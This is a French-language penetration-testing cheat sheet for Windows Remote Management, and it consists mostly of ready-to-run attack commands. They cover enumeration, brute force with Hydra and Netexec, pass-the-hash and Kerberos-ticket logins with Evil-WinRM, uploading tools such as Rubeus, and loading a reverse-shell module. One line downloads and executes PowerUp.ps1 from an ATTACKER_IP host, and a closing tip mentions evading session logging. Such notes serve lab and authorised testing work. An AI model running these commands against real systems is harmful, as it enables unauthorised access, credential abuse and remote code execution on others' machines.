# WinRM (5985,5986/TCP)

Windows Remote Management est un protocole permettant l'administration à distance de systèmes Windows.

## 🔍 Énumération

### Scan de base
```bash
# Vérifier si WinRM est actif (HTTP/HTTPS)
nmap -p 5985,5986 $IP

# Scanner en détail
nmap -sV -p 5985,5986 $IP
```

### Vérification d'accès
```bash
# Avec Metasploit
use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS $IP
run

# Avec Netexec
nxc winrm $IP
```

## 🔨 Exploitation

### Authentification
```bash
# Test de connexion avec Netexec
nxc winrm $IP -u $USER -p '$PASSWORD'

# Si le port SMB est fermé, ignorer la vérification SMB
nxc winrm $IP -u $USER -p '$PASSWORD' -d $DOMAIN --no-smb
```

### Exécution de commandes
```bash
# Exécution simple
nxc winrm $IP -u $USER -p '$PASSWORD' -x "whoami /all"

# Avec Evil-WinRM
evil-winrm -i $IP -u $USER -p '$PASSWORD'

# Avec Ticket Kerberos
KRB5CCNAME=$TICKET evil-winrm -i $IP -u $USER -r $DOMAIN
```

### Attaque par force brute
```bash
# Avec Hydra
hydra -L users.txt -P passwords.txt $IP winrm

# Avec Netexec
nxc winrm $IP -u users.txt -p passwords.txt
```

### Pass-the-Hash
```bash
# Avec Evil-WinRM
evil-winrm -i $IP -u Administrator -H 'HASH_NT'

# Avec Netexec
nxc winrm $IP -u Administrator -H 'HASH_NT'
```

## 🔐 Post-exploitation

### Transfert de fichiers
```bash
# Avec Evil-WinRM
# Téléverser un fichier
*Evil-WinRM* PS> upload /path/to/local/file.exe C:\Windows\Temp\file.exe

# Télécharger un fichier
*Evil-WinRM* PS> download C:\Windows\Temp\interesting.txt /path/to/local/
```

### Chargement de scripts PowerShell
```bash
# Avec Evil-WinRM
*Evil-WinRM* PS> Invoke-Binary /path/to/local/Rubeus.exe

# Charger un module PowerShell
*Evil-WinRM* PS> menu
*Evil-WinRM* PS> Invoke-PowerShellTcp
```

### Élévation de privilèges
```bash
# Vérifier les droits actuels
*Evil-WinRM* PS> whoami /priv

# Charger PowerUp
*Evil-WinRM* PS> IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
*Evil-WinRM* PS> Invoke-AllChecks
```

## ⚠️ Erreurs courantes & astuces
- WinRM nécessite souvent d'être membre du groupe "Remote Management Users"
- L'accès via WinRM peut être limité par des GPO (vérifiez les groupes)
- WinRM sur HTTPS (5986) peut nécessiter une validation de certificat
- Le firewall Windows peut bloquer WinRM même s'il est activé
- Les sessions WinRM sont journalisées (considérez les techniques d'évasion)